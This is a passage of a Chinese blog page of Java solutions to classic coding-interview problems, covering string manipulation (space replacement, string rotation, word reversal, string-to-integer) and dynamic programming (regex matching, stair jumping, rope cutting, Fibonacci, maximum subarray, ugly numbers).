<span class="title">printMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> r1 = <span class="number">0</span>, r2 = matrix.length - <span class="number">1</span>, c1 = <span class="number">0</span>, c2 = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (r1 &lt;= r2 &amp;&amp; c1 &lt;= c2) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = c1; i &lt;= c2; i++)</span><br><span class="line">            ret.add(matrix[r1][i]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = r1 + <span class="number">1</span>; i &lt;= r2; i++)</span><br><span class="line">            ret.add(matrix[i][c2]);</span><br><span class="line">        <span class="keyword">if</span> (r1 != r2)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = c2 - <span class="number">1</span>; i &gt;= c1; i--)</span><br><span class="line">                ret.add(matrix[r2][i]);</span><br><span class="line">        <span class="keyword">if</span> (c1 != c2)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = r2 - <span class="number">1</span>; i &gt; r1; i--)</span><br><span class="line">                ret.add(matrix[i][c1]);</span><br><span class="line">        r1++; r2--; c1++; c2--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="字符串">字符串</span></h1><h2><span id="替换空格">替换空格 √</span></h2><p>请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replaceSpace</span><span class="params">(StringBuffer str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1=str.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=p1;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(i)==<span class="string">' '</span>)</span><br><span class="line">                str.append(<span class="string">"  "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> p2=str.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(p1&gt;=<span class="number">0</span>&amp;&amp;p1&lt;p2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(p1)!=<span class="string">' '</span>)&#123;</span><br><span class="line">                str.setCharAt(p2--,str.charAt(p1--));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p1--;</span><br><span class="line">                str.setCharAt(p2--,<span class="string">'0'</span>);</span><br><span class="line">                str.setCharAt(p2--,<span class="string">'2'</span>);</span><br><span class="line">                str.setCharAt(p2--,<span class="string">'%'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="左旋转字符串">左旋转字符串 √</span></h2><p>汇编语言中有一种移位指令叫做循环左移（ROL），现在有个简单的任务，就是用字符串模拟这个指令的运算结果。对于一个给定的字符序列S，请你把其循环左移K位后的序列输出。例如，字符序列S=”abcXYZdef”,要求输出循环左移3位后的结果，即“XYZdefabc”。是不是很简单？OK，搞定它！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">LeftRotateString</span><span class="params">(String str,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="keyword">null</span>||str.length()==<span class="number">0</span>) <span class="keyword">return</span> str;</span><br><span class="line">        <span class="keyword">int</span> len = str.length();</span><br><span class="line">        n=n%len;      </span><br><span class="line">        <span class="keyword">char</span>[] c=str.toCharArray();</span><br><span class="line">        rotate(c,<span class="number">0</span>,n-<span class="number">1</span>);</span><br><span class="line">        rotate(c,n,len-<span class="number">1</span>);</span><br><span class="line">        rotate(c,<span class="number">0</span>,len-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> String.valueOf(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">char</span>[] c,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(hi&gt;lo)&#123;</span><br><span class="line">             <span class="keyword">char</span> tmp=c[lo];</span><br><span class="line">            c[lo]=c[hi];</span><br><span class="line">            c[hi]=tmp;</span><br><span class="line">            hi--;</span><br><span class="line">            lo++;</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="翻转单词顺序列">翻转单词顺序列 √</span></h2><p>牛客最近来了一个新员工Fish，每天早晨总是会拿着一本英文杂志，写些句子在本子上。同事Cat对Fish写的内容颇感兴趣，有一天他向Fish借来翻看，但却读不懂它的意思。例如，“student. a am I”。后来才意识到，这家伙原来把句子单词的顺序翻转了，正确的句子应该是“I am a student.”。Cat对一一的翻转这些单词顺序可不在行，你能帮助他么？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ReverseSentence</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(str.trim().equals(<span class="string">""</span>)||str.length()&lt;=<span class="number">1</span>)<span class="keyword">return</span> str;</span><br><span class="line">        String[] s=str.split(<span class="string">" "</span>);</span><br><span class="line">        String res=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=s.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            res+=s[i]+<span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.substring(<span class="number">0</span>,res.length()-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ReverseSentence</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = str.length();</span><br><span class="line">    <span class="keyword">char</span>[] chars = str.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == n || chars[j] == <span class="string">' '</span>) &#123;</span><br><span class="line">            reverse(chars, i, j - <span class="number">1</span>);</span><br><span class="line">            i = j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(chars, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(chars);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>[] c, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        swap(c, i++, j--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">char</span>[] c, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> t = c[i];</span><br><span class="line">    c[i] = c[j];</span><br><span class="line">    c[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="第一个只出现一次的字符">第一个只出现一次的字符 √</span></h2><p>在一个字符串(0&lt;=字符串长度&lt;=10000，全部由字母组成)中找到第一个只出现一次的字符,并返回它的位置, 如果没有则返回 -1（需要区分大小写）.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">FirstNotRepeatingChar</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span>[] map=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">52</span>];</span><br><span class="line">       Arrays.fill(map,-<span class="number">2</span>);</span><br><span class="line">       <span class="keyword">char</span> c[]=str.toCharArray();</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">           <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">           <span class="keyword">if</span>(c[i]&gt;<span class="string">'Z'</span>)&#123;</span><br><span class="line">               index=c[i]-<span class="string">'a'</span>+<span class="number">26</span>;                </span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              index =c[i]-<span class="string">'A'</span>;                </span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(map[index]==-<span class="number">2</span>) map[index]=i;</span><br><span class="line">           <span class="keyword">else</span> map[index]=-<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> res=Integer.MAX_VALUE;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">52</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(map[i]!=-<span class="number">2</span>&amp;&amp;map[i]!=-<span class="number">1</span>)&#123;</span><br><span class="line">               res=Math.min(res,map[i]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res==Integer.MAX_VALUE?-<span class="number">1</span>:res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="把字符串转化成整数">把字符串转化成整数 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">StrToInt</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> isNegative = str.charAt(<span class="number">0</span>) == <span class="string">'-'</span>;</span><br><span class="line">    <span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> c = str.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; (c == <span class="string">'+'</span> || c == <span class="string">'-'</span>))  <span class="comment">/* 符号判定 */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="string">'0'</span> || c &gt; <span class="string">'9'</span>)                <span class="comment">/* 非法输入 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        ret = ret * <span class="number">10</span> + (c - <span class="string">'0'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = isNegative? -ret:ret;</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;=Integer.MAX_VALUE&amp;&amp;ret&gt;=Integer.MIN_VALUE) <span class="keyword">return</span> (<span class="keyword">int</span>)ret;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="把数组排成最小的数-">把数组排成最小的数 -</span></h2><p>输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">PrintMinNumber</span><span class="params">(<span class="keyword">int</span> [] numbers)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (numbers == <span class="keyword">null</span> || numbers.length == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">int</span> n = numbers.length;</span><br><span class="line">            String[] nums = <span class="keyword">new</span> String[n];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                nums[i] = numbers[i] + <span class="string">""</span>;</span><br><span class="line">            Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1));</span><br><span class="line">            String ret = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (String str : nums)</span><br><span class="line">                ret += str;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="动态规划">动态规划</span></h1><h2><span id="正则表达式匹配-">正则表达式匹配 -</span></h2><p>请实现一个函数用来匹配包括’.’和’<em>‘的正则表达式。模式中的字符’.’表示任意一个字符，而’</em>‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”ab<em>ac</em>a”匹配，但是与”aa.a”和”ab*a”均不匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">match</span><span class="params">(<span class="keyword">char</span>[] str, <span class="keyword">char</span>[] pattern)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=str.length,n=pattern.length;</span><br><span class="line">        <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pattern[i-<span class="number">1</span>]==<span class="string">'*'</span>&amp;&amp;dp[<span class="number">0</span>][i-<span class="number">2</span>])dp[<span class="number">0</span>][i]=<span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(pattern[j-<span class="number">1</span>]==<span class="string">'.'</span>||pattern[j-<span class="number">1</span>]==str[i-<span class="number">1</span>])</span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(pattern[j-<span class="number">1</span>]==<span class="string">'*'</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(pattern[j-<span class="number">2</span>]==str[i-<span class="number">1</span>]||pattern[j-<span class="number">2</span>]==<span class="string">'.'</span>)&#123;</span><br><span class="line">                        dp[i][j]|=dp[i][j-<span class="number">2</span>]|dp[i][j-<span class="number">1</span>]|dp[i-<span class="number">1</span>][j];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dp[i][j]|=dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="跳台阶">跳台阶 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">JumpFloor</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=target;i++)&#123;</span><br><span class="line">        dp[i%<span class="number">4</span>]=dp[(i-<span class="number">1</span>)%<span class="number">4</span>]+dp[(i-<span class="number">2</span>)%<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target%<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="变态跳台阶">变态跳台阶 √</span></h2><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">JumpFloorII</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[]=<span class="keyword">new</span> <span class="keyword">int</span>[target+<span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">                dp[i]+=dp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="剪绳子">剪绳子 √</span></h2><p>给你一根长度为n的绳子，请把绳子剪成整数长的m段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为k[0],k[1],…,k[m]。请问k[0]xk[1]x…xk[m]可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">            dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j)));</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="斐波那契">斐波那契 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= N ; i++)&#123;</span><br><span class="line">        dp[i%<span class="number">3</span>] = dp[(i-<span class="number">1</span>)%<span class="number">3</span>] + dp[(i-<span class="number">2</span>)%<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N%<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="矩形覆盖">矩形覆盖 √</span></h2><p>我们可以用2<em>1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2</em>1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？</p><p>比如n=3时，2*3的矩形块有3种覆盖方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">RectCover</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">      dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">      dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">          dp[i%<span class="number">4</span>]=dp[(i-<span class="number">1</span>)%<span class="number">4</span>]+dp[(i-<span class="number">2</span>)%<span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> dp[n%<span class="number">4</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="连续数组的最大和">连续数组的最大和 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">FindGreatestSumOfSubArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(array==<span class="keyword">null</span>||array.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">       <span class="keyword">int</span> res=array[<span class="number">0</span>];</span><br><span class="line">       <span class="keyword">int</span> dp[]=<span class="keyword">new</span> <span class="keyword">int</span>[array.length];</span><br><span class="line">        dp[<span class="number">0</span>]=res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i-<span class="number">1</span>]+array[i]&gt;array[i])</span><br><span class="line">                dp[i]=dp[i-<span class="number">1</span>]+array[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i]=array[i];</span><br><span class="line">            res=Math.max(dp[i],res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="丑数">丑数 ×</span></h2><p>把只包含质因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含质因子7。 习惯上我们把1当做是第一个丑数。求按从小到大的顺序的第N个丑数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetUglyNumber_Solution</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt;= <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    <span class="keyword">int</span> i2 = <span class="number">0</span>, i3 = <span class="number">0</span>, i5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> next2 = dp[i2] * <span class="number">2</span>, next3 = dp[i3] * <span class="number">3</span>, next5 = dp[i5] * <span class="number">5</span>;</span><br><span class="line">        dp[i] = Math.min(next2, Math.min(next3, next5));</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next2)</span><br><span class="line">            i2++;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next3)</span><br><span class="line">            i3++;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next5)</span><br><span class="line">            i5++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N - 